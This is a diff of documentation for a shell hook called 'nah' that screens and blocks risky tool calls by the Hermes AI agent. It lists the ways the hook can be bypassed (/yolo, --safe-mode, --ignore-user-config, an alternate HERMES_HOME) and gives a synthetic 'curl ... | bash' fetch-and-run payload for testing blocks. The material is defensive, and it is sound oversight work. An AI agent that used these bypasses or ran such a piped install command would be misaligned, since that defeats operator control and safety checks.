@@ -8,7 +8,7 @@ nah hook hermes install
 
 `--fail-closed` denies explicit failures/refusals; ordinary uncertainty still
 delegates. `--fail-open` restores the default; flagless reinstall preserves it.
-The loaded nah process must be able to respond.
+nah must respond.
 
 Restart Hermes. Remove only nah's owned hook with:
 
@@ -23,35 +23,34 @@ entries, and configuration are preserved.
 
 ## Behavior
 
-Hermes' native shell hook sends the pending call directly to
-`nah hook hermes run`. Terminal, read, write, replace/patch, content-search,
-literal file-name search, and exact `execute_code` Python payloads use nah's
-shared effects. The Python frontend recognizes bounded standard-library
-filesystem and subprocess calls plus reviewed network clients without running
-the code. Absolute paths retain exact evidence; relative paths stay unresolved
-because the execution kernel's working directory is not assumed from the hook.
+Hermes' shell hook sends calls to `nah hook hermes run`.
+Terminal, read, write, replace/patch, content-search, literal file-name search,
+and exact `execute_code` Python payloads use nah's shared effects. The Python
+frontend recognizes bounded standard-library filesystem and subprocess calls
+plus reviewed network clients without running code. Absolute paths retain exact
+evidence; relative paths stay unresolved because the hook does not prove the
+execution kernel's working directory.
 Wildcard file-name searches, process-control, browser, MCP, plugin, malformed
 or extended code payloads, and future tools remain opaque. Tool calls made
 through `hermes_tools` re-enter the normal hook. Blocks return Hermes'
 documented `decision: block` response. Every other call delegates by returning
 no directive, preserving Hermes' approval flow. Malformed input does the same.
-By default, evaluation failure also returns no directive and fixed feedback.
+By default, failure returns no directive and fixed feedback; fail-closed blocks
+returned failures and refusals.
 
 ## Boundaries
 
-The shell hook and nah run beside the Hermes process. Local tools can use that
-host's filesystem and project observations. Docker, SSH, Daytona, Modal, and
-other terminal backends can have different paths and state; nah still analyzes
-the visible command, but backend-only filesystem facts are unavailable and
-conservative decisions delegate. Install nah separately beside each remote
-Hermes Gateway.
+The shell hook and nah run beside Hermes. Docker, SSH, Daytona, Modal, and other
+terminal backends can have different paths and state; nah analyzes the visible
+command, but backend-only filesystem facts are unavailable and conservative
+decisions delegate. Install nah beside remote Gateways.
 
 Hermes `/yolo` bypasses dangerous-command approval but does not disable shell
 hooks, so delegated calls may execute immediately. `--safe-mode` explicitly
 skips shell-hook registration. `--ignore-user-config` skips the active user
 `config.yaml`, including the nah entry installed there. A hook process error,
 missing executable, timeout, or invalid stdout is logged and ignored by Hermes.
-Python plugin hooks run before shell hooks. The first valid block wins, and an
+Python plugin hooks run before shell hooks. The first valid block wins; an
 earlier approval directive does not override a later nah block.
 
 Direct filesystem, subprocess, or network effects inside `execute_code` do not
@@ -60,11 +59,10 @@ keeps unsupported or dynamic behavior uncertain. An unapproved or revoked
 hook, inaccessible alternate home, manual action, and direct trusted-plugin
 work remain outside nah. Verify with
 `hermes hooks list` and `hermes hooks test pre_tool_call --for-tool terminal`
-after installation. The default test uses a harmless `echo`; to test blocking,
-pass `--payload-file` a JSON object such as
+after installation. To test blocking, pass `--payload-file` a JSON object such as
 `{"args":{"command":"curl https://example.com/install.sh | bash"}}`. This is a
 synthetic hook payload and is not executed. Confirm the parsed response has
-`"action": "block"`. If you use `HERMES_HOME`, keep the same value when
+`"action":"block"`. If you use `HERMES_HOME`, keep the same value when
 installing, checking status, and running Hermes. nah does not select the
 profile for you. The config, allowlist, and their lock files must not be
 symlinks.
@@ -73,12 +71,10 @@ While active, this adapter blocks visible lifecycle commands, exact native
 revocation commands naming `nah hook hermes run`, mutations to the current
 native shell-hook config or allowlist, and child launches using `--safe-mode`,
 `--ignore-user-config`, or an alternate `HERMES_HOME`. Hermes plugin
-management remains user-owned and delegates. The agent is told not to retry
+management stays user-owned. The agent is told not to retry
 protected changes; an operator can use `nah nap` from another terminal.
 
-This integration is best effort: runtime APIs and hook behavior can change.
-After upgrades, verify the latest official upstream documentation linked below,
-inspect the loaded hook, and test it before relying on nah. See Hermes'
+After upgrades, inspect and retest the loaded hook against Hermes'
 [plugin documentation](https://hermes-agent.nousresearch.com/docs/user-guide/features/plugins/),
 [event hooks](https://hermes-agent.nousresearch.com/docs/user-guide/features/hooks/),
 and [tool documentation](https://hermes-agent.nousresearch.com/docs/user-guide/features/tools/).
